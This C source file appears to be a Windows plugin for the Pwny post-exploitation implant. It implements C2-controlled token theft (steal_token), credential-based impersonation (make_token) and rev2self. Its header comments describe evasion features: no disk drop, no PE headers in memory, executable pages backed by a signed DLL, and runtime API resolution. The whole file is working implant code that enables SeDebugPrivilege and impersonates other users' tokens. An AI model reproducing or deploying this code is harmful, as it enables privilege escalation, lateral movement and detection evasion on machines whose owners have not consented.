/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Token COT plugin — steal_token, make_token, rev2self.
 *
 * Built as a COT (Code-Only Tab) blob: no PE headers in memory,
 * no disk drop, all executable pages backed by a signed system DLL.
 * All Pwny API calls go through the vtable; all Win32 APIs are
 * resolved at runtime via cot_resolve().
 *
 * NOTE: token_getuid remains in the core (getuid.h) since it is
 * a benign identity check used by the always-loaded getuid command.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

/* tab_cot.h MUST come after the real Pwny headers: its macros
 * redefine api_call_register, tlv_pkt_get_*, etc. and would break
 * the function declarations in api.h / tlv.h if included first. */
#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Win32 function pointer types — resolved at init via cot_resolve()   */
/* ------------------------------------------------------------------ */

typedef int    (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWSTR, int,
                                                LPSTR, int, LPCSTR, LPBOOL);
typedef BOOL   (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef HANDLE (WINAPI *fn_GetCurrentProcess)(void);
typedef BOOL   (WINAPI *fn_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL   (WINAPI *fn_AdjustTokenPrivileges)(HANDLE, BOOL,
                                                   PTOKEN_PRIVILEGES, DWORD,
                                                   PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef DWORD  (WINAPI *fn_GetLastError)(void);
typedef BOOL   (WINAPI *fn_GetTokenInformation)(HANDLE,
                                                 TOKEN_INFORMATION_CLASS,
                                                 LPVOID, DWORD, PDWORD);
typedef BOOL   (WINAPI *fn_LookupAccountSidW)(LPCWSTR, PSID, LPWSTR,
                                               LPDWORD, LPWSTR, LPDWORD,
                                               PSID_NAME_USE);
typedef HANDLE (WINAPI *fn_OpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL   (WINAPI *fn_DuplicateTokenEx)(HANDLE, DWORD,
                                              LPSECURITY_ATTRIBUTES,
                                              SECURITY_IMPERSONATION_LEVEL,
                                              TOKEN_TYPE, PHANDLE);
typedef BOOL   (WINAPI *fn_ImpersonateLoggedOnUser)(HANDLE);
typedef BOOL   (WINAPI *fn_RevertToSelf)(void);
typedef BOOL   (WINAPI *fn_LogonUserA)(LPCSTR, LPCSTR, LPCSTR, DWORD,
                                        DWORD, PHANDLE);

typedef int    (__cdecl *fn__snprintf)(char *, size_t, const char *, ...);

static struct
{
    fn_WideCharToMultiByte      pWideCharToMultiByte;
    fn_OpenProcessToken         pOpenProcessToken;
    fn_GetCurrentProcess        pGetCurrentProcess;
    fn_LookupPrivilegeValueA    pLookupPrivilegeValueA;
    fn_AdjustTokenPrivileges    pAdjustTokenPrivileges;
    fn_CloseHandle              pCloseHandle;
    fn_GetLastError             pGetLastError;
    fn_GetTokenInformation      pGetTokenInformation;
    fn_LookupAccountSidW        pLookupAccountSidW;
    fn_OpenProcess              pOpenProcess;
    fn_DuplicateTokenEx         pDuplicateTokenEx;
    fn_ImpersonateLoggedOnUser  pImpersonateLoggedOnUser;
    fn_RevertToSelf             pRevertToSelf;
    fn_LogonUserA               pLogonUserA;
    fn__snprintf                p_snprintf;
} w;

/* ------------------------------------------------------------------ */
/* Tag definitions                                                     */
/* ------------------------------------------------------------------ */


#define TOKEN_STEAL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)
#define TOKEN_REV2SELF \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)
#define TOKEN_MAKE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 3)

#define TLV_TYPE_TOKEN_USER   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_TOKEN_DOMAIN TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_TOKEN_PASS   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)

/* ------------------------------------------------------------------ */
/* State                                                               */
/* ------------------------------------------------------------------ */

static HANDLE stolen_token = NULL;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

/* Local wchar_to_utf8 — COT does not include misc.c */
static char *local_wchar_to_utf8(const wchar_t *in)
{
    char *out;
    int len;

    if (in == NULL)
    {
        return NULL;
    }

    len = w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, NULL, 0, NULL, NULL);
    if (len <= 0)
    {
        return NULL;
    }

    out = calloc(len, sizeof(char));
    if (out == NULL)
    {
        return NULL;
    }

    if (w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, out, len, NULL, FALSE) == 0)
    {
        free(out);
        return NULL;
    }

    return out;
}

static int token_enable_privilege(LPCSTR priv)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!w.pOpenProcessToken(w.pGetCurrentProcess(),
                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return -1;
    }

    if (!w.pLookupPrivilegeValueA(NULL, priv, &luid))
    {
        w.pCloseHandle(hToken);
        return -1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    w.pAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    w.pCloseHandle(hToken);

    return (w.pGetLastError() == ERROR_NOT_ALL_ASSIGNED) ? -1 : 0;
}

static int token_get_username(HANDLE hToken, char *buf, size_t buf_size)
{
    BYTE tokenInfo[4096];
    DWORD dwSize;
    WCHAR cbUser[512], cbDomain[512];
    DWORD dwUserSize = sizeof(cbUser) / sizeof(WCHAR);
    DWORD dwDomainSize = sizeof(cbDomain) / sizeof(WCHAR);
    DWORD dwSidType = 0;
    char *domain;
    char *user;

    if (!w.pGetTokenInformation(hToken, TokenUser, tokenInfo,
                                sizeof(tokenInfo), &dwSize))
    {
        return -1;
    }

    if (!w.pLookupAccountSidW(NULL, ((TOKEN_USER *)tokenInfo)->User.Sid,
                              cbUser, &dwUserSize, cbDomain,
                              &dwDomainSize, (PSID_NAME_USE)&dwSidType))
    {
        return -1;
    }

    domain = local_wchar_to_utf8(cbDomain);
    user = local_wchar_to_utf8(cbUser);

    if (domain == NULL || user == NULL)
    {
        free(domain);
        free(user);
        return -1;
    }

    w.p_snprintf(buf, buf_size, "%s\\%s", domain, user);
    buf[buf_size - 1] = '\0';

    free(domain);
    free(user);

    return 0;
}

/* ------------------------------------------------------------------ */
/* Handlers                                                            */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *token_steal(c2_t *c2)
{
    int pid;
    HANDLE hProcess;
    HANDLE hToken;
    HANDLE hDupToken;
    tlv_pkt_t *result;
    char username[1024];

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    token_enable_privilege("SeDebugPrivilege");

    hProcess = w.pOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (hProcess == NULL)
    {
        log_debug("* OpenProcess(%d) failed (%lu)\n", pid, w.pGetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pOpenProcessToken(hProcess,
                             TOKEN_DUPLICATE | TOKEN_QUERY |
                             TOKEN_IMPERSONATE, &hToken))
    {
        log_debug("* OpenProcessToken failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pCloseHandle(hProcess);

    if (!w.pDuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                             SecurityImpersonation, TokenImpersonation,
                             &hDupToken))
    {
        log_debug("* DuplicateTokenEx failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pCloseHandle(hToken);

    if (!w.pImpersonateLoggedOnUser(hDupToken))
    {
        log_debug("* ImpersonateLoggedOnUser failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hDupToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (stolen_token != NULL)
    {
        w.pCloseHandle(stolen_token);
    }
    stolen_token = hDupToken;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (token_get_username(hDupToken, username, sizeof(username)) == 0)
    {
        tlv_pkt_add_string(result, TLV_TYPE_TOKEN_USER, username);
    }

    return result;
}

static tlv_pkt_t *token_rev2self(c2_t *c2)
{
    w.pRevertToSelf();

    if (stolen_token != NULL)
    {
        w.pCloseHandle(stolen_token);
        stolen_token = NULL;
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *token_make(c2_t *c2)
{
    char domain[256];
    char user[256];
    char password[256];
    HANDLE hToken;
    HANDLE hDupToken;
    tlv_pkt_t *result;
    char username[1024];

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TOKEN_DOMAIN, domain) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TOKEN_USER, user) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TOKEN_PASS, password) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pLogonUserA(user, domain, password,
                       LOGON32_LOGON_NEW_CREDENTIALS,
                       LOGON32_PROVIDER_WINNT50,
                       &hToken))
    {
        log_debug("* token_make: LogonUser failed (%lu)\n", w.pGetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pDuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                             SecurityImpersonation, TokenImpersonation,
                             &hDupToken))
    {
        log_debug("* token_make: DuplicateTokenEx failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pCloseHandle(hToken);

    if (!w.pImpersonateLoggedOnUser(hDupToken))
    {
        log_debug("* token_make: ImpersonateLoggedOnUser failed (%lu)\n",
                  w.pGetLastError());
        w.pCloseHandle(hDupToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (stolen_token != NULL)
    {
        w.pCloseHandle(stolen_token);
    }
    stolen_token = hDupToken;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (token_get_username(hDupToken, username, sizeof(username)) == 0)
    {
        tlv_pkt_add_string(result, TLV_TYPE_TOKEN_USER, username);
    }

    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Resolve Win32 APIs once at load time */
    w.pWideCharToMultiByte     = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                      "WideCharToMultiByte");
    w.pOpenProcessToken        = (fn_OpenProcessToken)cot_resolve("advapi32.dll",
                                                                    "OpenProcessToken");
    w.pGetCurrentProcess       = (fn_GetCurrentProcess)cot_resolve("kernel32.dll",
                                                                     "GetCurrentProcess");
    w.pLookupPrivilegeValueA   = (fn_LookupPrivilegeValueA)cot_resolve("advapi32.dll",
                                                                         "LookupPrivilegeValueA");
    w.pAdjustTokenPrivileges   = (fn_AdjustTokenPrivileges)cot_resolve("advapi32.dll",
                                                                         "AdjustTokenPrivileges");
    w.pCloseHandle             = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                               "CloseHandle");
    w.pGetLastError            = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                                "GetLastError");
    w.pGetTokenInformation     = (fn_GetTokenInformation)cot_resolve("advapi32.dll",
                                                                       "GetTokenInformation");
    w.pLookupAccountSidW       = (fn_LookupAccountSidW)cot_resolve("advapi32.dll",
                                                                      "LookupAccountSidW");
    w.pOpenProcess             = (fn_OpenProcess)cot_resolve("kernel32.dll",
                                                               "OpenProcess");
    w.pDuplicateTokenEx        = (fn_DuplicateTokenEx)cot_resolve("advapi32.dll",
                                                                     "DuplicateTokenEx");
    w.pImpersonateLoggedOnUser = (fn_ImpersonateLoggedOnUser)cot_resolve("advapi32.dll",
                                                                           "ImpersonateLoggedOnUser");
    w.pRevertToSelf            = (fn_RevertToSelf)cot_resolve("advapi32.dll",
                                                                "RevertToSelf");
    w.pLogonUserA              = (fn_LogonUserA)cot_resolve("advapi32.dll",
                                                              "LogonUserA");

    /* CRT */
    w.p_snprintf               = (fn__snprintf)cot_resolve("msvcrt.dll",
                                                             "_snprintf");

    /* Register handlers */
    api_call_register(api_calls, TOKEN_STEAL,    (api_t)token_steal);
    api_call_register(api_calls, TOKEN_REV2SELF, (api_t)token_rev2self);
    api_call_register(api_calls, TOKEN_MAKE,     (api_t)token_make);
}

#endif
